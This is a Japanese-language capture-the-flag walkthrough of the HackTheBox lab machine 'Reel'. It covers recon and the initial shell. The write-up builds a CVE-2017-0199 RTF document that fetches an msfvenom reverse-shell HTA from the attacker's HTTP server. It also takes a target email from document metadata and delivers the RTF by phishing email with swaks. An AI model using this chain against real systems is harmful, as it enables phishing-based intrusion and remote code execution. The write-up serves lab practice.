# Recon

```
nmap --reason -Pn -T4 -sV -p- 10.10.10.77
...
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
22/tcp open  ssh     syn-ack ttl 127 OpenSSH 7.6 (protocol 2.0)
25/tcp open  smtp?   syn-ack ttl 127
```

ftpにアノニマスログインし、いくつかファイルがあったのでダウンロードする：

```
┌──(shoebill㉿shoebill)-[~]
└─$ ftp 10.10.10.77  
Connected to 10.10.10.77.
220 Microsoft FTP Service
Name (10.10.10.77:shoebill): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
05-28-18  11:19PM       <DIR>          documents
226 Transfer complete.
ftp> cd documents
ftp> dir
05-28-18  11:19PM                 2047 AppLocker.docx
05-28-18  01:01PM                  124 readme.txt
10-31-17  09:13PM                14581 Windows Event Forwarding.docx

ftp> get AppLocker.docx
ftp> get readme.txt
ftp> get "Windows Event Forwarding.docx"
```

```
┌──(shoebill㉿shoebill)-[~/Reel_10.10.10.77/FTP_Docs]
└─$ cat readme.txt 
please email me any rtf format procedures - I'll review and convert.

new format / converted documents will be saved here.
```

readme.txtの内容より、rtfファイルを送ればそれをレビューしてフォーマット変換するらしい。

rtfに関する脆弱性をググるとCVE-2017-0199が見つかった。

そのツールキットがgithubにあったのでそれを使う：

```
┌──(shoebill㉿shoebill)-[~/Reel_10.10.10.77]
└─$ git clone https://github.com/bhdresh/CVE-2017-0199.git
┌──(shoebill㉿shoebill)-[~/Reel_10.10.10.77]
└─$ cd CVE-2017-0199.git
```

このツールキットで、悪意のあるhtaファイルをダウンロード・実行させるようなrtfファイルが作れる。

そこでまず、リバースシェルを起動するようなhtaファイルをつくる：

```
┌──(shoebill㉿shoebill)-[~/Reel_10.10.10.77/CVE-2017-0199]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.5 LPORT=4444 -f hta-psh -o shell.hta
```

ツールキットでrtfファイル（test.rtf）を作る：
```
┌──(shoebill㉿shoebill)-[~/Reel_10.10.10.77/CVE-2017-0199]
└─$ python cve-2017-0199_toolkit.py -M gen -t RTF -w test.rtf -u http://10.10.16.5:8000/shell.hta
Generating normal RTF payload.

Generated test.rtf successfull
```
ターゲットがこのrtfファイルを開くと、ローカル（10.10.16.5）の8000ポートで立っているHTTPサーバにアクセスが来て、shell.htaをダウンロード実行する。

さて、肝心の”送り先メールアドレス”について。次のように、Windows Event Forwarding.docx（Windows_Event_Forwarding.docxに改名した）のメタデータにメールアドレスがある：

```
┌──(shoebill㉿shoebill)-[~/Reel_10.10.10.77]
└─$ exiftool Windows_Event_Forwarding.docx
ExifTool Version Number         : 12.44
File Name                       : Windows_Event_Forwarding.docx
Directory                       : .
File Size                       : 15 kB
File Modification Date/Time     : 2017:11:01 06:13:23+09:00
File Access Date/Time           : 2022:10:30 20:14:09+09:00
File Inode Change Date/Time     : 2022:10:30 20:11:30+09:00
File Permissions                : -rw-r--r--
File Type                       : DOCX
File Type Extension             : docx
MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
Zip Required Version            : 20
Zip Bit Flag                    : 0x0006
Zip Compression                 : Deflated
Zip Modify Date                 : 1980:01:01 00:00:00
Zip CRC                         : 0x82872409
Zip Compressed Size             : 385
Zip Uncompressed Size           : 1422
Zip File Name                   : [Content_Types].xml
Creator                         : nico@megabank.com
Revision Number                 : 4
...
```

# initial shell

以上でエクスプロイト実行の準備が整った。

リバーシェルに対するリスナーをたてる：

```
┌──(shoebill㉿shoebill)-[~/Reel_10.10.10.77]
└─$ rlwrap nc -nvlp 4444
```

shell.htaとtest.rtfがあるディレクトリ上でHTTPサーバをたてる：
```
┌──(shoebill㉿shoebill)-[~/Reel_10.10.10.77/CVE-2017-0199]
└─$ ls
cve-2017-0199_toolkit.py  shell.hta  template  test.rtf
                                                                                                          
┌──(shoebill㉿shoebill)-[~/Reel_10.10.10.77/CVE-2017-0199]
└─$ python3 -m http.server   
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
`swaks`コマンドでメールを送る：

```
┌──(shoebill㉿shoebill)-[~/Reel_10.10.10.77/CVE-2017-0199]
└─$ swaks --to nico@megabank.com --from kail@shoebill.com --server 10.10.10.77 --header "test rtf" --body "check my rtf file" --attach ./test.rtf
```

これでユーザnicoのシェルがとれる：

![inishell](https://user-images.githubusercontent.com/85237728/198999395-7382a52b-278c-4873-82f7-6f86cb6e3a41.png)

